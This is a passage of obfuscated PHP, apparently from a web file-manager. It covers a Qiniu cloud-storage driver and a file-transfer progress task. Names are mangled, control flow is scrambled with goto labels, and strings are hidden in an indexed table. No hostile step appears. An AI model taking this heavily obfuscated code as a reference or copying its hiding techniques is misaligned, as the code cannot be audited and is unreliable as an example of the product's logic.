array($Bí÷‚éåè[202] => $c»–ÀÆùË, $Bí÷‚éåè[203] => $CêÜãÏ¡Å›); } goto dÃÖŠÆİÍÏ; bùºà¢ „: $Bí÷‚éåè =& $_SERVER[Ç³Íß¦Ó]; $dğÃ·øœ¢Ê = trim($dğÃ·øœ¢Ê, $Bí÷‚éåè[8]); $a÷¥Á“Ö•É = empty($dğÃ·øœ¢Ê) ? $Bí÷‚éåè[33] : $dğÃ·øœ¢Ê . $Bí÷‚éåè[8]; goto Cö–ªùÅˆ¯; dÃÖŠÆİÍÏ: return !1; goto f‘ÔÃÉĞè; f‘ÔÃÉĞè: } public function listAll($A‰¯ùØ‰³ˆ) { $BíèºÙƒÜÏ =& $_SERVER[Ç³Íß¦Ó]; $fÎÃ‹·¨Ì = $this->fileList($A‰¯ùØ‰³ˆ, $BíèºÙƒÜÏ[33], !0); $a¯µ¥º¾áë = array(); foreach ($fÎÃ‹·¨Ì[$BíèºÙƒÜÏ[74]] as $F±á›ğŒî) { $a¯µ¥º¾áë[$F±á›ğŒî[$BíèºÙƒÜÏ[93]]] = $F±á›ğŒî[$BíèºÙƒÜÏ[78]]; } foreach ($fÎÃ‹·¨Ì[$BíèºÙƒÜÏ[75]] as $F±á›ğŒî) { if (is_string($F±á›ğŒî)) { $a¯µ¥º¾áë[$F±á›ğŒî] = 0; } } return $this->listAllFiles($A‰¯ùØ‰³ˆ, array_keys($a¯µ¥º¾áë), $a¯µ¥º¾áë); } private function fileList($fÒ‰ö·¼†Š, $c’ÃÌÉ¸·Ğ = '', $aÀ„Ğìó…‘ = 0) { goto eÍ†œµÅ; aÃÑõäƒŞ±: $dŠÁÍ£«“‘ = $d®¥ÔæÙ­í = array(); while (!0) { check_abort(); list($eî‡‘ª‰Ú´, $dÂá©êÊÀ­) = $this->bucketManager->listFiles($this->bucket, $BÍÌò˜ÂóÓ, $Dã¬¯ç–·‘, $eÈ¤İ´Å«œ, $c’ÃÌÉ¸·Ğ); if ($dÂá©êÊÀ­) { break; } $Dã¬¯ç–·‘ = array_key_exists($dŸ ÃÎÇÆá[1272], $eî‡‘ª‰Ú´) ? $Dã¬¯ç–·‘ = $eî‡‘ª‰Ú´[$dŸ ÃÎÇÆá[1304]] : $dŸ ÃÎÇÆá[33]; $AİóâÚËæö = isset($eî‡‘ª‰Ú´[$dŸ ÃÎÇÆá[1305]]) ? $eî‡‘ª‰Ú´[$dŸ ÃÎÇÆá[1305]] : array(); $D¾È¢™ˆª– = isset($eî‡‘ª‰Ú´[$dŸ ÃÎÇÆá[1306]]) ? $eî‡‘ª‰Ú´[$dŸ ÃÎÇÆá[1306]] : array(); foreach ($AİóâÚËæö as $fˆƒ‹º‡Ú) { goto dİ×ïÆ…æ„; C‡ëŸº: $fˆƒ‹º‡Ú[$dŸ ÃÎÇÆá[78]] = $A»Õ…ÚÛÎ; $aÜíøÆ±’ = $A»Õ…ÚÛÎ == 0 && substr($d‹É‡á¨¶, strlen($d‹É‡á¨¶) - 1, 1) == $dŸ ÃÎÇÆá[8] ? !0 : !1; if ($aˆœŠˆƒ¤‰) { $this->cacheMethod($dŸ ÃÎÇÆá[198], $d‹É‡á¨¶, $aÜíøÆ±’); $this->cacheMethod($dŸ ÃÎÇÆá[199], $d‹É‡á¨¶, $fˆƒ‹º‡Ú); } goto cê–•õ¥•Œ; cê–•õ¥•Œ: if ($aÜíøÆ±’) { $dŠÁÍ£«“‘[] = $d‹É‡á¨¶; continue; } $d®¥ÔæÙ­í[] = $aÀ„Ğìó…‘ ? $fˆƒ‹º‡Ú : $d‹É‡á¨¶; goto F’†Ô©Æ¯; dİ×ïÆ…æ„: if ($fˆƒ‹º‡Ú[$dŸ ÃÎÇÆá[93]] == $BÍÌò˜ÂóÓ) { continue; } $d‹É‡á¨¶ = $fˆƒ‹º‡Ú[$dŸ ÃÎÇÆá[93]]; $A»Õ…ÚÛÎ = $fˆƒ‹º‡Ú[$dŸ ÃÎÇÆá[1302]]; goto C‡ëŸº; F’†Ô©Æ¯: } foreach ($D¾È¢™ˆª– as $d‹É‡á¨¶) { if ($d‹É‡á¨¶ == $BÍÌò˜ÂóÓ) { continue; } $dŠÁÍ£«“‘[] = $d‹É‡á¨¶; if ($aˆœŠˆƒ¤‰) { $this->cacheMethod($dŸ ÃÎÇÆá[198], $d‹É‡á¨¶, !0); } } if ($Dã¬¯ç–·‘ === $dŸ ÃÎÇÆá[33]) { break; } } if ($aˆœŠˆƒ¤‰) { $this->cacheMethod($dŸ ÃÎÇÆá[198], $fÒ‰ö·¼†Š, !0); } goto f×Ë¦Ü­Š¶; a˜¢á’£¼: $Dã¬¯ç–·‘ = $dŸ ÃÎÇÆá[33]; $eÈ¤İ´Å«œ = 1000; $aˆœŠˆƒ¤‰ = $this->listItemCache === !1 ? !1 : !0; goto aÃÑõäƒŞ±; eÍ†œµÅ: $dŸ ÃÎÇÆá =& $_SERVER[Ç³Íß¦Ó]; $fÒ‰ö·¼†Š = trim($fÒ‰ö·¼†Š, $dŸ ÃÎÇÆá[8]); $BÍÌò˜ÂóÓ = empty($fÒ‰ö·¼†Š) ? $dŸ ÃÎÇÆá[33] : $fÒ‰ö·¼†Š . $dŸ ÃÎÇÆá[8]; goto a˜¢á’£¼; f×Ë¦Ü­Š¶: return array($dŸ ÃÎÇÆá[75] => $dŠÁÍ£«“‘, $dŸ ÃÎÇÆá[74] => $d®¥ÔæÙ­í); goto Fù¾áË‚É’; Fù¾áË‚É’: } public function canRead($fÉÌÜçªÊ) { return $this->exist($fÉÌÜçªÊ) ? !0 : !1; } public function canWrite($cô¤Ò•±°‘) { return $this->exist($cô¤Ò•±°‘) ? !0 : !1; } public function getContent($AõÂšÓµÌ) { return $this->fileSubstr($AõÂšÓµÌ, 0, -1); } public function setContent($A°–”“ÌÙ‘, $b¯ğ¥©¯ï˜ = '') { $F†ëƒºŒº = $this->tempFile($this->pathThis($A°–”“ÌÙ‘)); file_put_contents($F†ëƒºŒº, $b¯ğ¥©¯ï˜); if ($this->upload($A°–”“ÌÙ‘, $F†ëƒºŒº)) { $this->tempFileRemve($F†ëƒºŒº); return !0; } return !1; } public function refreshUrls($DØ…ì–µ‚¨) { goto b«è’ëó£Ï; aÃ£’Š†: $AßŠÍ¥Û¹Ç = new Qiniu\Cdn\CdnManager($this->auth); list($CĞìŸ˜É¤¶, $fÁ™¯ø…ñ) = $AßŠÍ¥Û¹Ç->refreshUrls($bÖöôÉÈ™Â); if ($fÁ™¯ø…ñ) { return !1; } goto F«‡ôç¼Ó; b«è’ëó£Ï: $C¶…ôƒºË— =& $_SERVER[Ç³Íß¦Ó]; $bÖöôÉÈ™Â = array(); if (is_array($DØ…ì–µ‚¨)) { foreach ($DØ…ì–µ‚¨ as $D•Óˆ¡ÆƒÙ) { $bÖöôÉÈ™Â[] = $this->link($D•Óˆ¡ÆƒÙ); } } else { $bÖöôÉÈ™Â[] = $this->link($DØ…ì–µ‚¨); } goto aÃ£’Š†; F«‡ôç¼Ó: return $CĞìŸ˜É¤¶[$C¶…ôƒºË—[1078]] == $C¶…ôƒºË—[721] ? !0 : !1; goto cØ¾Œ¡ ®Ú; cØ¾Œ¡ ®Ú: } public function fileSubstr($AÖ´Î¢å²Ä, $B†Ó¦ˆœÓé, $A·Ø¢…˜) { $DÔÊ©ˆë‰Î =& $_SERVER[Ç³Íß¦Ó]; if (!($eÜù…½ŠëÛ = $this->link($AÖ´Î¢å²Ä))) { return !1; } $b˜§éÎĞ–½ = !1; if ($A·Ø¢…˜ > 0) { $D—ìÍàŞ¡ = $B†Ó¦ˆœÓé + $A·Ø¢…˜ - 1; $b˜§éÎĞ–½ = array($DÔÊ©ˆë‰Î[1307] . $B†Ó¦ˆœÓé . $DÔÊ©ˆë‰Î[438] . $D—ìÍàŞ¡); } $bâ¿’Õ½ = url_request($eÜù…½ŠëÛ, $DÔÊ©ˆë‰Î[227], !1, $b˜§éÎĞ–½); return $bâ¿’Õ½[$DÔÊ©ˆë‰Î[714]] ? $bâ¿’Õ½[$DÔÊ©ˆë‰Î[1088]] : !1; } public function upload($D…Ç¼Ş‹, $eìœë‰âåò, $D©À˜ˆÉï = false, $EÙÉµ¡’ = REPEAT_REPLACE) { $eòà‚ë† = new Qiniu\Storage\UploadManager(); $b­î¹„™İ½ = $this->auth->uploadToken($this->bucket, $D…Ç¼Ş‹); $Dºƒ´ÂÒÊÅ = get_file_mime(get_path_ext($eìœë‰âåò)); list($eº•Ç‘Äëì, $aæ¬×”±­’) = $eòà‚ë†->putFile($b­î¹„™İ½, $D…Ç¼Ş‹, $eìœë‰âåò, null, $Dºƒ´ÂÒÊÅ); return $aæ¬×”±­’ ? !1 : $this->getPathOuter($D…Ç¼Ş‹); } public function uploadFormData($bÀÙƒ‡”Ã, $CôÆ¯Ø·‚– = 3600) { return $this->uploadToken($bÀÙƒ‡”Ã, $CôÆ¯Ø·‚–); } public function multiUploadFormData($bª¤—®ÕÉ, $C–ÖùÔ†•É = 3600) { return $this->uploadToken($bª¤—®ÕÉ, $C–ÖùÔ†•É); } private function uploadToken($DñÌµ®ˆğ, $Aì«ÇÌÔàã = 3600) { goto FóìŒ³´•Ÿ; f¦àøö¨Ó: $aæØµ††• = http_type() . "\x3a\x2f\57\x75\160\154\157\x61\144{$bÅ—ò‚Î‚}\56\x71\x69\156\x69\165\160\x2e\x63\x6f\x6d\57"; return array($CĞ©¦¦¢Ş[1311] => $AÚÍ•×Æ¼, $CĞ©¦¦¢Ş[1312] => $aæØµ††•); goto cƒßÂâ•©; F·ëÒö¢î®: $a³¤²ğÎ = $DñÌµ®ˆğ; $AÚÍ•×Æ¼ = $this->auth->uploadToken($this->bucket, $a³¤²ğÎ, $FÄÏ•éó¤ª, $bçœîºÑÇÀ, !0); $bÅ—ò‚Î‚ = empty($this->region) || $this->region == $CĞ©¦¦¢Ş[1310] ? $CĞ©¦¦¢Ş[33] : $CĞ©¦¦¢Ş[438] . $this->region; goto f¦àøö¨Ó; FóìŒ³´•Ÿ: $CĞ©¦¦¢Ş =& $_SERVER[Ç³Íß¦Ó]; $FÄÏ•éó¤ª = $Aì«ÇÌÔàã; $bçœîºÑÇÀ = array($CĞ©¦¦¢Ş[1308] => $CĞ©¦¦¢Ş[1309]); goto F·ëÒö¢î®; cƒßÂâ•©: } public function download($B‰ Š³À¥, $AãŒˆ¯‰°) { goto Cø§©Â·ñ; Câˆ‘êÀšõ: $f×™Æä = 1024 * 200; $C¥Ï“ÇåáË = fopen($E‡‰¯’³‹‰, $_SERVER[Ç³Íß¦Ó][1313]); while (!0) { $Cîˆ‡•îÊ® = $this->fileSubstr($B‰ Š³À¥, $E­Æ›Àô¡Ë, $f×™Æä); if ($Cîˆ‡•îÊ® === !1) { return !1; } fwrite($C¥Ï“ÇåáË, $Cîˆ‡•îÊ®); $E­Æ›Àô¡Ë += $f×™Æä; if (strlen($Cîˆ‡•îÊ®) < $f×™Æä) { break; } } goto AÜ„§Õ‡Òé; AÜ„§Õ‡Òé: fclose($C¥Ï“ÇåáË); return $AãŒˆ¯‰°; goto bÂÄ…”Áù; Cø§©Â·ñ: $E‡‰¯’³‹‰ = IO::getPathInner(IO::mkfile($AãŒˆ¯‰°)); if (!($E¾•¯ãÇ¶ = $this->link($B‰ Š³À¥))) { return !1; } $E­Æ›Àô¡Ë = 0; goto Câˆ‘êÀšõ; bÂÄ…”Áù: } public function link($BˆÎç¢‹í‚, $bö‰æ¼¬Ò = '') { if (!$this->isFile($BˆÎç¢‹í‚)) { return !1; } $BåÀåŠË—Ú = $this->getHost() . $_SERVER[Ç³Íß¦Ó][8] . $this->pathEncode($BˆÎç¢‹í‚) . $bö‰æ¼¬Ò; return $this->auth->privateDownloadUrl($BåÀåŠË—Ú, 3600 * 12); } public function fileOut($eĞÕŠëºĞĞ, $fˆ«¥ÁÕÆ = false, $fÁÚ„ÁµÜ = false, $A½ÓÃ©‘¤Ó = '') { $C”ƒ‡ö‰ =& $_SERVER[Ç³Íß¦Ó]; if ($this->isFileOutServer()) { return $this->fileOutServer($eĞÕŠëºĞĞ, $fˆ«¥ÁÕÆ, $fÁÚ„ÁµÜ, $A½ÓÃ©‘¤Ó); } if (!$fÁÚ„ÁµÜ) { $fÁÚ„ÁµÜ = $this->pathThis($eĞÕŠëºĞĞ); } $e¿Ç‰ôÌÍ = $fˆ«¥ÁÕÆ ? $C”ƒ‡ö‰[1314] . rawurlencode($fÁÚ„ÁµÜ) : $C”ƒ‡ö‰[33]; $b‹ºÕ…ÎÈ’ = $this->link($eĞÕŠëºĞĞ, $e¿Ç‰ôÌÍ); $this->fileOutLink($b‹ºÕ…ÎÈ’); } public function fileOutServer($C«ˆÓ·ø”, $BËë’…ù = false, $CÓŠ§¡°íÂ = false, $aµ´Û¬ÌÑŠ = '') { parent::fileOut($C«ˆÓ·ø”, $BËë’…ù, $CÓŠ§¡°íÂ, $aµ´Û¬ÌÑŠ); } public function fileOutImage($Cò»“ĞÖö, $A¢¥ôÕîˆ› = 250) { $e¤ìğ½Ø¢Ï = $this->link($Cò»“ĞÖö, $_SERVER[Ç³Íß¦Ó][1315] . $A¢¥ôÕîˆ›); $this->fileOutLink($e¤ìğ½Ø¢Ï); } public function fileOutImageServer($CÕÅœß™, $a¼¶åÊªìê = 250) { parent::fileOutImage($CÕÅœß™, $a¼¶åÊªìê); } public function hashMd5($B‚à¨Ô®£Â) { $dëÒÕ‘ˆàÏ =& $_SERVER[Ç³Íß¦Ó]; $fÁ˜óÎšäé = $this->objectMeta($B‚à¨Ô®£Â); return isset($fÁ˜óÎšäé[$dëÒÕ‘ˆàÏ[207]]) ? $fÁ˜óÎšäé[$dëÒÕ‘ˆàÏ[207]] : !1; $DÚÒ“ƒäí = $this->link($B‚à¨Ô®£Â, $dëÒÕ‘ˆàÏ[1316]); } public function size($b çÄÉÀ°) { $C¡òæ‘èÛ– = $this->objectMeta($b çÄÉÀ°); return $C¡òæ‘èÛ– ? $C¡òæ‘èÛ–[$_SERVER[Ç³Íß¦Ó][78]] : 0; } public function info($BŒô£†ª†) { if ($this->isFolder($BŒô£†ª†)) { return $this->folderInfo($BŒô£†ª†); } else { if ($this->isFile($BŒô£†ª†)) { return $this->fileInfo($BŒô£†ª†); } } return !1; } public function exist($dˆ¦Ş°õÌ¹) { return $this->isFile($dˆ¦Ş°õÌ¹) || $this->isFolder($dˆ¦Ş°õÌ¹); } public function isFile($cì¤›í¥¹É) { return !$this->isFolder($cì¤›í¥¹É) && $this->objectMeta($cì¤›í¥¹É); } public function isFolder($d³ù‚†êò) { return $this->cacheMethod($_SERVER[Ç³Íß¦Ó][198], $d³ù‚†êò); } protected function objectMeta($c‡Í½à“¼†) { return $this->cacheMethod($_SERVER[Ç³Íß¦Ó][199], $c‡Í½à“¼†); } protected function _objectMeta($C´ÑÄ•Óˆ²) { $A„óÓõè®Š =& $_SERVER[Ç³Íß¦Ó]; list($b•ö‡‰ß¶É, $EáÀ¬æÎ™‘) = $this->bucketManager->stat($this->bucket, $C´ÑÄ•Óˆ²); if ($b•ö‡‰ß¶É) { $b•ö‡‰ß¶É[$A„óÓõè®Š[78]] = intval($b•ö‡‰ß¶É[$A„óÓõè®Š[1302]]); } return $b•ö‡‰ß¶É; } protected function _isFolder($F‡„Ì‹çíå) { $C¥—é«‡Ú¾ =& $_SERVER[Ç³Íß¦Ó]; if ($F‡„Ì‹çíå == $C¥—é«‡Ú¾[33] || $F‡„Ì‹çíå == $C¥—é«‡Ú¾[8]) { return !0; } list($CçíñíÊÜó, $F×›‹ÔÇÛÑ) = $this->bucketManager->listFiles($this->bucket, trim($F‡„Ì‹çíå, $C¥—é«‡Ú¾[8]) . $C¥—é«‡Ú¾[8], $C¥—é«‡Ú¾[33], 1, $C¥—é«‡Ú¾[8]); return !empty($CçíñíÊÜó[$C¥—é«‡Ú¾[1305]]) || !empty($CçíñíÊÜó[$C¥—é«‡Ú¾[1306]]) ? !0 : !1; } } goto eÛ…ãĞ¢‚Í; Eâ†ÂÓ¨î: class TaskFileTransfer extends Task { protected function startAfter() { goto bÖ‚‚ö; E½×šÓï—¹: Hook::bind($dÒŞ×æÛÃ´[1561], array($this, $dÒŞ×æÛÃ´[1562])); Hook::bind($dÒŞ×æÛÃ´[1563], array($this, $dÒŞ×æÛÃ´[1564])); Hook::bind($dÒŞ×æÛÃ´[1565], array($this, $dÒŞ×æÛÃ´[1566])); goto c²Ê¨µóƒ; AÄ®Ûœ”²Î: Hook::bind($dÒŞ×æÛÃ´[538], array($this, $dÒŞ×æÛÃ´[1557])); Hook::bind($dÒŞ×æÛÃ´[540], array($this, $dÒŞ×æÛÃ´[1557])); Hook::bind($dÒŞ×æÛÃ´[542], array($this, $dÒŞ×æÛÃ´[1557])); goto CóóñÓ‹—·; bÖ‚‚ö: $dÒŞ×æÛÃ´ =& $_SERVER[Ç³Íß¦Ó]; $b£âÌÒááğ =& $this->task; $this->sourceCopyFolder = !1; goto A†Ç‘Öİ‘; Eöñ÷´Öî¨: Hook::bind($dÒŞ×æÛÃ´[565], array($this, $dÒŞ×æÛÃ´[1554])); Hook::bind($dÒŞ×æÛÃ´[566], array($this, $dÒŞ×æÛÃ´[1555])); Hook::bind($dÒŞ×æÛÃ´[568], array($this, $dÒŞ×æÛÃ´[1556])); goto AÀÄšÜÜ†ù; A†Ç‘Öİ‘: Hook::bind($dÒŞ×æÛÃ´[1549], array($this, $dÒŞ×æÛÃ´[1550])); Hook::bind($dÒŞ×æÛÃ´[1110], array($this, $dÒŞ×æÛÃ´[1551])); Hook::bind($dÒŞ×æÛÃ´[1552], array($this, $dÒŞ×æÛÃ´[1553])); goto Eöñ÷´Öî¨; AÀÄšÜÜ†ù: Hook::bind($dÒŞ×æÛÃ´[569], array($this, $dÒŞ×æÛÃ´[1556])); Hook::bind($dÒŞ×æÛÃ´[536], array($this, $dÒŞ×æÛÃ´[1557])); Hook::bind($dÒŞ×æÛÃ´[533], array($this, $dÒŞ×æÛÃ´[1557])); goto AÄ®Ûœ”²Î; CóóñÓ‹—·: Hook::bind($dÒŞ×æÛÃ´[1558], array($this, $dÒŞ×æÛÃ´[1559])); Hook::bind($dÒŞ×æÛÃ´[558], array($this, $dÒŞ×æÛÃ´[1560])); $this->sourceModelCopyFlag = !1; goto E½×šÓï—¹; CåÓğòİ¸: $b£âÌÒááğ[$dÒŞ×æÛÃ´[1573]] = 0; $b£âÌÒááğ[$dÒŞ×æÛÃ´[1574]] = 0; if (!$b£âÌÒááğ[$dÒŞ×æÛÃ´[1432]]) { $b£âÌÒááğ[$dÒŞ×æÛÃ´[1432]] = LNG($dÒŞ×æÛÃ´[1575]); } goto A¤æ÷ÆÊ®÷; BõñäÎÖ: $b£âÌÒááğ[$dÒŞ×æÛÃ´[1023]] = $dÒŞ×æÛÃ´[33]; $b£âÌÒááğ[$dÒŞ×æÛÃ´[1571]] = $dÒŞ×æÛÃ´[33]; $b£âÌÒááğ[$dÒŞ×æÛÃ´[1572]] = 0; goto CåÓğòİ¸; c²Ê¨µóƒ: $b£âÌÒááğ[$dÒŞ×æÛÃ´[1567]] = LNG($dÒŞ×æÛÃ´[1568]); $b£âÌÒááğ[$dÒŞ×æÛÃ´[1569]] = 0; $b£âÌÒááğ[$dÒŞ×æÛÃ´[1570]] = 0; goto BõñäÎÖ; A¤æ÷ÆÊ®÷: } protected function endAfter() { goto aæÏ‹””Ù¸; EŠíš©—åÈ: Hook::unbind($D·ßÂîƒ³©[568], array($this, $D·ßÂîƒ³©[1556])); Hook::unbind($D·ßÂîƒ³©[569], array($this, $D·ßÂîƒ³©[1556])); Hook::unbind($D·ßÂîƒ³©[536], array($this, $D·ßÂîƒ³©[1557])); goto F­¨‚ÀÌÌã; F­¨‚ÀÌÌã: Hook::unbind($D·ßÂîƒ³©[533], array($this, $D·ßÂîƒ³©[1557])); Hook::unbind($D·ßÂîƒ³©[538], array($this, $D·ßÂîƒ³©[1557])); Hook::unbind($D·ßÂîƒ³©[540], array($this, $D·ßÂîƒ³©[1557])); goto aïÍé­Åù¢; aæÏ‹””Ù¸: $D·ßÂîƒ³© =& $_SERVER[Ç³Íß¦Ó]; Hook::unbind($D·ßÂîƒ³©[1549], array($this, $D·ßÂîƒ³©[1550])); Hook::unbind($D·ßÂîƒ³©[1110], array($this, $D·ßÂîƒ³©[1551])); goto aŒ¦çĞÏĞ¹; aÓÌ‘²‚¹: Hook::unbind($D·ßÂîƒ³©[1561], array($this, $D·ßÂîƒ³©[1562])); Hook::unbind($D·ßÂîƒ³©[1563], array($this, $D·ßÂîƒ³©[1564])); Hook::unbind($D·ßÂîƒ³©[1565], array($this, $D·ßÂîƒ³©[1566])); goto FŒíÌâˆ«¦; aŒ¦çĞÏĞ¹: Hook::unbind($D·ßÂîƒ³©[1552], array($this, $D·ßÂîƒ³©[1553])); Hook::unbind($D·ßÂîƒ³©[565], array($this, $D·ßÂîƒ³©[1554])); Hook::unbind($D·ßÂîƒ³©[566], array($this, $D·ßÂîƒ³©[1555])); goto EŠíš©—åÈ; aïÍé­Åù¢: Hook::unbind($D·ßÂîƒ³©[542], array($this, $D·ßÂîƒ³©[1557])); Hook::unbind($D·ßÂîƒ³©[1558], array($this, $D·ßÂîƒ³©[1559])); Hook::unbind($D·ßÂîƒ³©[558], array($this, $D·ßÂîƒ³©[1560])); goto aÓÌ‘²‚¹; FŒíÌâˆ«¦: } public function copyMoveStart($BßğÆĞ…«‘, $Fğ¶„ïŒÒ, $dÚëˆÍ¡›², $B©›Š¿Ñ) { goto C¨Ñç÷îã¹; aøÍ¤£»„å: $eñ–™£‚¯²[$fíŠœØØïÙ[1577]] = KodIO::transferType($BßğÆĞ…«‘, $dÚëˆÍ¡›²); $this->update(); goto E×¹ÚÇõÉÖ; C¨Ñç÷îã¹: $fíŠœØØïÙ =& $_SERVER[Ç³Íß¦Ó]; self::log($fíŠœØØïÙ[1576] . $Fğ¶„ïŒÒ . $fíŠœØØïÙ[67] . $B©›Š¿Ñ); $CÏ¤ç…§ø = rtrim(TEMP_FILES, $fíŠœØØïÙ[8]); goto FÛ³¤”Áª×; FÛ³¤”Áª×: if (substr($Fğ¶„ïŒÒ, 0, strlen($CÏ¤ç…§ø)) == $CÏ¤ç…§ø) { return; } if (substr($B©›Š¿Ñ, 0, strlen($CÏ¤ç…§ø)) == $CÏ¤ç…§ø) { return; } $eñ–™£‚¯² =& $this->task; goto aøÍ¤£»„å; E×¹ÚÇõÉÖ: } public function updateAfter() { goto c¬Ã†ºô¸¢; c¬Ã†ºô¸¢: $cÇÒ‰´¹£· =& $_SERVER[Ç³Íß¦Ó]; $FÚƒÃ¹Áó =& $this->task; if (!$FÚƒÃ¹Áó[$cÇÒ‰´¹£·[724]]) { return; } goto dÇÈÛÆâ»å; d¥àÙÄ¤¹: $FÚƒÃ¹Áó[$cÇÒ‰´¹£·[1527]] = $FÚƒÃ¹Áó[$cÇÒ‰´¹£·[1574]] / $FÚƒÃ¹Áó[$cÇÒ‰´¹£·[724]]; if ($FÚƒÃ¹Áó[$cÇÒ‰´¹£·[1527]] > 0) { $AÚÈº¤öˆ = timeFloat() - $FÚƒÃ¹Áó[$cÇÒ‰´¹£·[750]] - $FÚƒÃ¹Áó[$cÇÒ‰´¹£·[1530]]; $FÚƒÃ¹Áó[$cÇÒ‰´¹£·[1531]] = $AÚÈº¤öˆ * (1 - $FÚƒÃ¹Áó[$cÇÒ‰´¹£·[1527]]) / $FÚƒÃ¹Áó[$cÇÒ‰´¹£·[1527]]; } goto F¿Ç¾¯‘º•; dÇÈÛÆâ»å: if ($this->sourceModelCopyFlag) { return; } if ($FÚƒÃ¹Áó[$cÇÒ‰´¹£·[1577]] == $cÇÒ‰´¹£·[1181]) { return; } if ($FÚƒÃ¹Áó[$cÇÒ‰´¹£·[1577]] == $cÇÒ‰´¹£·[1094] || $FÚƒÃ¹Áó[$cÇÒ‰´¹£·[1577]] == $cÇÒ‰´¹£·[107]) { if ($FÚƒÃ¹Áó[$cÇÒ‰´¹£·[1571]]) { $FÚƒÃ¹Áó[$cÇÒ‰´¹£·[1574]] = $FÚƒÃ¹Áó[$cÇÒ‰´¹£·[1573]] + $FÚƒÃ¹Áó[$cÇÒ‰´¹£·[1570]]; } } else { if ($FÚƒÃ¹Áó[$cÇÒ‰´¹£·[1577]] == $cÇÒ‰´¹£·[1182]) { if ($FÚƒÃ¹Áó[$cÇÒ‰´¹£·[1571]] == $cÇÒ‰´¹£·[1094]) { $FÚƒÃ¹Áó[$cÇÒ‰´¹£·[1574]] = $FÚƒÃ¹Áó[$cÇÒ‰´¹£·[1573]] + $FÚƒÃ¹Áó[$cÇÒ‰´¹£·[1570]] * 0.5; } else { if ($FÚƒÃ¹Áó[$cÇÒ‰´¹£·[1571]] == $cÇÒ‰´¹£·[107]) { $FÚƒÃ¹Áó[$cÇÒ‰´¹£·[1574]] = $FÚƒÃ¹Áó[$cÇÒ‰´¹£·[1573]] + $FÚƒÃ¹Áó[$cÇÒ‰´¹£·[1569]] * 0.5 + $FÚƒÃ¹Áó[$cÇÒ‰´¹£·[1570]] * 0.5; } } } } goto d¥àÙÄ¤¹; F¿Ç¾¯‘º•: } public function addPath($aêŒø‰“Öš) { goto AèØ¥‹ò; A¡ÖÍ›«›: $d÷ŞÓÂ¯¬’ = IO::infoWithChildren($aêŒø‰“Öš); $Aö¨‘ÖÂáë = $EŞã†¯†Ê‚[$D¹Ì‚È–[1578]] ? $EŞã†¯†Ê‚[$D¹Ì‚È–[1578]][$D¹Ì‚È–[1579]] : 0; $EŞã†¯†Ê‚[$D¹Ì‚È–[1578]] = array($D¹Ì‚È–[1579] => $Aö¨‘ÖÂáë + 1, $D¹Ì‚È–[411] => $d÷ŞÓÂ¯¬’[$D¹Ì‚È–[28]], $D¹Ì‚È–[76] => $d÷ŞÓÂ¯¬’[$D¹Ì‚È–[76]], $D¹Ì‚È–[493] => $d÷ŞÓÂ¯¬’[$D¹Ì‚È–[493]] ? $d÷ŞÓÂ¯¬’[$D¹Ì‚È–[493]] : $d÷ŞÓÂ¯¬’[$D¹Ì‚È–[76]]); goto D¾ğãÓÉãñ; AèØ¥‹ò: $D¹Ì‚È– =& $_SERVER[Ç³Íß¦Ó]; if (!$aêŒø‰“Öš) { return; } $EŞã†¯†Ê‚ =& $this->task; goto A¡ÖÍ›«›; D¾ğãÓÉãñ: if ($d÷ŞÓÂ¯¬’[$D¹Ì‚È–[29]] == $D¹Ì‚È–[192]) { $EŞã†¯†Ê‚[$D¹Ì‚È–[1021]] += 1; } else { $EŞã†¯†Ê‚[$D¹Ì‚È–[1021]] += $d÷ŞÓÂ¯¬’[$D¹Ì‚È–[81]][$D¹Ì‚È–[79]]; if ($d÷ŞÓÂ¯¬’[$D¹Ì‚È–[394]]) { $EŞã†¯†Ê‚[$D¹Ì‚È–[1021]] += $d÷ŞÓÂ¯¬’[$D¹Ì‚È–[81]][$D¹Ì‚È–[80]] + 1; } } $EŞã†¯†Ê‚[$D¹Ì‚È–[724]] += $d÷ŞÓÂ¯¬’[$D¹Ì‚È–[78]]; $this->update(); goto aÙ†ê§Êßô; aÙ†ê§Êßô: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($bË³ó§Œ›©) { $e´ ®Íµ£¹ =& $_SERVER[Ç³Íß¦Ó]; $bÖ¹ÒŸã† =& $this->task; $bÖ¹ÒŸã†[$e´ ®Íµ£¹[1567]] = $bË³ó§Œ›©[$e´ ®Íµ£¹[28]]; $bÖ¹ÒŸã†[$e´ ®Íµ£¹[1023]] = $bË³ó§Œ›©[$e´ ®Íµ£¹[28]]; $this->update(); } public function copyFileStart($CÏëÅõí¸¦, $FÒó´ø£ö•, $cŒÄ‚¹Å‚, $a„–¥Í·š, $D¤êƒ¹Ö, $bÎØåô‚‡­) { goto BÕÔù”ÇÃ; F±ó„…¾Á: $f´ÎàÊ”ƒò[$Cªæ¿½Ÿë[1023]] = $Cªæ¿½Ÿë[33]; $f´ÎàÊ”ƒò[$Cªæ¿½Ÿë[1571]] = $Cªæ¿½Ÿë[33]; $f´ÎàÊ”ƒò[$Cªæ¿½Ÿë[1572]] = 0; goto cî®Û‚áŠÕ; d‡ˆ‹ÒÕéÈ: $f´ÎàÊ”ƒò[$Cªæ¿½Ÿë[1567]] = $aÎµ‚ÈÎÑ; $f´ÎàÊ”ƒò[$Cªæ¿½Ÿë[1569]] = (int) $CÏëÅõí¸¦->size($FÒó´ø£ö•); $f´ÎàÊ”ƒò[$Cªæ¿½Ÿë[1570]] = 0; goto F±ó„…¾Á; BÕÔù”ÇÃ: $Cªæ¿½Ÿë =& $_SERVER[Ç³Íß¦Ó]; $aÎµ‚ÈÎÑ = $D¤êƒ¹Ö; if ($aÎµ‚ÈÎÑ == $GLOBALS[$Cªæ¿½Ÿë[1580]]) { $aÎµ‚ÈÎÑ = $GLOBALS[$Cªæ¿½Ÿë[1581]]; } goto e¾Ø¶å–ˆ; cî®Û‚áŠÕ: $this->update(); goto F—¾Üù×Ï; e¾Ø¶å–ˆ: $GLOBALS[$Cªæ¿½Ÿë[1581]] = $D¤êƒ¹Ö; $GLOBALS[$Cªæ¿½Ÿë[1580]] = $bÎØåô‚‡­; $f´ÎàÊ”ƒò =& $this->task; goto d‡ˆ‹ÒÕéÈ; F—¾Üù×Ï: } public function copyFileEnd($Côâ†‘â¬, $Bá¢ŒîÂ£†, $D»ÀÒ°£öÅ, $B…²›ô¬­Œ, $e˜î‘–Æ×Å, $F¶¯–˜±¨…) { $bË§¡¨Ç¾ =& $_SERVER[Ç³Íß¦Ó]; $B¼À²È´µ =& $this->task; 